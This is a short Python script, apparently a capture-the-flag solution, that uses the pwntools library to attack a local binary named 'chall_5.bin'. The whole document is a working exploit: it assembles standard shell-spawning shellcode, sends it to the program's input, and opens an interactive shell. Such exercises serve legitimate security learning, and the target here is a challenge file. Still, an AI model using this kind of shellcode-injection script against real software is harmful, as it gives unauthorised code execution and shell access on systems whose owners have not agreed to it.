#!/usr/bin/env python3

from pwn import *

p = process("./chall_5.bin")

payload = asm(shellcraft.sh())

p.recv()
p.sendline(payload)
p.interactive()